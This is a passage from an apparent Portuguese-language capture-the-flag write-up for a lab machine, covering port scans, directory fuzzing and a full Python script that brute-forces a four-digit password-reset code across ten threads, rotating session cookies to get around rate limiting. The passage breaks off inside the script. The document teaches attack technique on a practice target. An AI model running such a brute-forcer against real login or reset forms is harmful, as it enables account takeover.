+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.32s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.31 seconds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -Pn -sS --open -p- 10.10.19.190
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-10 16:00 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> hammer.thm <span style="color:#f92672">(</span>10.10.19.190<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65471</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">62</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>1337/tcp open  waste
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -Pn -sV -p 22,1337 10.10.19.190 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-10 16:04 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> hammer.thm <span style="color:#f92672">(</span>10.10.19.190<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1337/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.03 seconds</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Há um serviço web sendo executado na porta <code>1337</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/homepage.png" alt="home page"  loading="lazy" /></p>
+<p>Realizamos uma enumeração dos diretórios disponíveis.<br>
+Encontramos três diretórios: <code>javascript</code>, <code>vendor</code> e <code>phpmyadmin</code>.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/recon_gobuster.png" alt="recon_gobuster"  loading="lazy" /></p>
+<p>Analisando os diretórios, descobrimos no diretório <code>vendor</code> uma biblioteca, que realiza o <em>decode</em> e <em>encode</em> do JSON Web Token (JWT) a biblioteca utilizada é:<code>firebase versão 6.10.0</code>.</p>
+<p>Quando verificamos o código fonte, da página inicial, identificamos uma anotação do desenvolvedor.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --&gt;</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Vamos realizar novamente uma enumeração em busca de diretórios, agora com a string <code>hmr_</code>  incluída.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.19.190:1337/hmr_FUZZ -fs <span style="color:#ae81ff">276</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/img/posts/2025/02/hammer/recon_ffuf.png" alt="recon_ffuf"  loading="lazy" /></p>
+<p>No diretório <code>hmr_images</code>temos uma imagem, verificado os metadados, não identificamos nenhuma informação relevante.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/exiftool.png" alt="exiftool"  loading="lazy" /></p>
+<p>Os diretórios <code>hmr_css</code>e <code>hmr_js</code>, temos apenas arquivos que realizam a manipulação das páginas HTML do site.</p>
+<p>No diretório <code>hmr_logs</code> temos logs de tentativa de acesso.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/hmr_logs.png" alt="hmr_logs"  loading="lazy" /></p>
+<p>Os diretórios informados no log foram verificados, não estão disponíveis para acesso até o momento.
+Com o e-mail <code>tester@hammer.thm</code> tentamos recuperar a senha, é enviado um <code>token</code> de 4 dígitos.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/recovery_code_page.png" alt="recovery_code"  loading="lazy" /></p>
+<p>Temos uma contagem regressiva de 180 segundos, para informar o código OTP.
+Além disso, existe um controle contra <em>brute force</em>, após algumas tentativas a aplicação nos bloqueia.</p>
+<p><img src="/assets/img/posts/2025/02/hammer/rate_limit.png" alt="rate_limit"  loading="lazy" /></p>
+<p>Se alterarmos o nosso <strong>cookie</strong>, podemos reiniciar o processo de recuperação de senha. Precisamos informar o e-mail novamente. Após informar o e-mail, podemos inserir o código OTP mais uma vez.</p>
+<h2 data-hextra-search-id="exploração">Exploração<span class="hx:absolute hx:-mt-20" id="exploração"></span>
+    <a href="#explora%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Primeiro, vamos criar nossa <em>wordlist</em> com 4 dígitos, que inicia em <code>0000</code> até <code>9999</code>.
+Para essa tarefa utilizaremos o <code>crunch</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex/Desktop<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4</span> -o otp.txt -t %%%%
+</span></span><span style="display:flex;"><span>Crunch will now generate the following amount of data: <span style="color:#ae81ff">50000</span> bytes
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> MB
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> GB
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> TB
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> PB
+</span></span><span style="display:flex;"><span>Crunch will now generate the following number of lines: <span style="color:#ae81ff">10000</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>crunch: 100% completed generating output</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Temos 9999 números para serem testados, se cada número demorar 1 segundo para ser testado, ficaríamos mais de 2 horas realizando o ataque de <em>brute force</em>.
+Para diminuir esse tempo, vamos dividir por 10, nosso programa irá executar 10 processos em paralelo.</p>
+<p>O fluxo do programa será da seguinte maneira:</p>
+<ol>
+<li>
+<p><strong>Ler os códigos OTP:</strong></p>
+<ul>
+<li>Abrir o arquivo com os códigos de recuperação e armazená-los em uma lista.</li>
+</ul>
+</li>
+<li>
+<p><strong>Dividir a lista de OTPs:</strong></p>
+<ul>
+<li>Dividir a lista de OTPs em 10 partes, uma para cada thread.</li>
+</ul>
+</li>
+<li>
+<p><strong>Executar threads:</strong></p>
+<ul>
+<li>Utilizar <code>ThreadPoolExecutor</code> para criar 10 threads.</li>
+</ul>
+</li>
+<li>
+<p><strong>Enviar a requisição inicial:</strong></p>
+<ul>
+<li>Cada thread gera um cookie aleatório e envia a requisição inicial com o e-mail.</li>
+</ul>
+</li>
+<li>
+<p><strong>Processar os códigos OTP:</strong></p>
+<ul>
+<li>Cada thread processa sua parte da lista de OTPs, enviando requisições POST com o código de recuperação.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verificar resposta da página:</strong></p>
+<ul>
+<li>Para cada requisição:
+<ul>
+<li>Se a resposta contiver &ldquo;Invalid or expired recovery code!&rdquo;, continuar com o próximo código da lista.</li>
+<li>Se a resposta contiver &ldquo;Rate limit exceeded. Please try again later.&rdquo;, gerar um novo cookie e tentar novamente.</li>
+<li>Se a resposta não contiver nenhuma dessas mensagens, considerar o código como válido.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Encerrar threads:</strong></p>
+<ul>
+<li>Quando um código válido for encontrado, todas as threads são interrompidas.</li>
+<li>Exibir o código válido encontrado, o cabeçalho recebido e o cookie utilizado.</li>
+</ul>
+</li>
+</ol>
+<p>O código foi desenvolvido em python 3.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> concurrent.futures <span style="color:#f92672">import</span> ThreadPoolExecutor
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Event
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># URL de recuperação de senha</span>
+</span></span><span style="display:flex;"><span>url_reset_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://hammer.thm:1337/reset_password.php&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Evento para sinalizar que o código correto foi encontrado</span>
+</span></span><span style="display:flex;"><span>codigo_valido_encontrado <span style="color:#f92672">=</span> Event()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Função para gerar um cookie aleatório</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gerar_cookie_aleatorio</span>(tamanho<span style="color:#f92672">=</span><span style="color:#ae81ff">27</span>):
+</span></span><span style="display:flex;"><span>    caracteres <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(caracteres) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(tamanho))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Função para enviar a requisição inicial</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enviar_primeiro_cabecalho</span>():
+</span></span><span style="display:flex;"><span>    headers_primeiro <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Host&#39;</span>: <span style="color:#e6db74">&#39;hammer.thm:1337&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate, br&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Length&#39;</span>: <span style="color:#e6db74">&#39;25&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://hammer.thm:1337&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://hammer.thm:1337/reset_password.php&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;PHPSESSID=</span><span style="color:#e6db74">{</span>gerar_cookie_aleatorio()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Priority&#39;</span>: <span style="color:#e6db74">&#39;u=0, i&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    data_primeiro <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#e6db74">&#39;tester@hammer.thm&#39;</span>}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url_reset_password, headers<span style="color:#f92672">=</span>headers_primeiro, data<span style="color:#f92672">=</span>data_primeiro)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Primeiro cabeçalho enviado. Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> headers_primeiro[<span style="color:#e6db74">&#39;Cookie&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Função para enviar a requisição com o código de recuperação</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enviar_segundo_cabecalho</span>(cookie, recovery_code):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> codigo_valido_encontrado<span style="color:#f92672">.</span>is_set():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    headers_segundo <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Host&#39;</span>: <span style="color:#e6db74">&#39;hammer.thm:1337&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate, br&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Length&#39;</span>: <span style="color:#e6db74">&#39;24&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://hammer.thm:1337&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://hammer.thm:1337/reset_password.php&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: cookie,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Priority&#39;</span>: <span style="color:#e6db74">&#39;u=0, i&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    data_segundo <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;recovery_code&#39;</span>: recovery_code, <span style="color:#e6db74">&#39;s&#39;</span>: <span style="color:#e6db74">&#39;180&#39;</span>}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url_reset_password, headers<span style="color:#f92672">=</span>headers_segundo, data<span style="color:#f92672">=</span>data_segundo)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Verifica a resposta da página</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Invalid or expired recovery code!&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Código OTP utilizado: </span><span style="color:#e6db74">{</span>recovery_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> - Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> - Código Inválido&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;Rate limit exceeded. Please try again later.&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Rate limit exceeded com código: </span><span style="color:#e6db74">{</span>recovery_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> - Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;rate_limit&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Código OTP utilizado: </span><span style="color:#e6db74">{</span>recovery_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> - Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> - Código Válido&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Cabeçalho recebido: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>headers<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Cookie: </span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        codigo_valido_encontrado<span style="color:#f92672">.</span>set()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Função principal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Arquivo com os códigos de recuperação</span>
+</span></span><span style="display:flex;"><span>    arquivo_codigos <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;otp.txt&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Lê os códigos do arquivo</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(arquivo_codigos, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        codigos <span style="color:#f92672">=</span> [linha<span style="color:#f92672">.</span>strip() <span style="color:#66d9ef">for</span> linha <span style="color:#f92672">in</span> file<span style="color:#f92672">.</span>readlines()]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Divide a lista de OTPs em 10 partes</span>
+</span></span><span style="display:flex;"><span>    num_threads <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>    chunk_size <span style="color:#f92672">=</span> len(codigos) <span style="color:#f92672">//</span> num_threads
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> [codigos[i:i <span style="color:#f92672">+</span> chunk_size] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(codigos), chunk_size)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">processar_codigo</span>(chunk):
+</span></span><span style="display:flex;"><span>        cookie <span style="color:#f92672">=</span> enviar_primeiro_cabecalho()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> codigo <span style="color:#f92672">in</span> chunk:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> codigo_valido_encontrado<span style="color:#f92672">.</span>is_set():
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            resultado <span style="color:#f92672">=</span> enviar_segundo_cabecalho(cookie, codigo)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> resultado <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;rate_limit&#39;</span>:
+</span></span><span style="display:flex;"><span>                cookie <span style="color:#f92672">=</span> enviar_primeiro_cabecalho()
+</span></span><span style="display:flex;"><span>                resultado <span style="color:#f92672">=</span> enviar_segundo_cabecalho(cookie, codigo)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> resultado <span style="color:#f92672">is</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> ThreadPoolExecutor(max_workers<span style="color:#f92672">=</span>num_threads) <span style="color:#66d9ef">as</span> executor:
+</span></span><span style="display:flex;"><span>        futures <span style="color:#f92672">=</span> [executor<span style="color:#f92672">.</span>submit(processar_codigo, chunk) <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> chunks]
+</span></span><span style="display:flex;"><span>
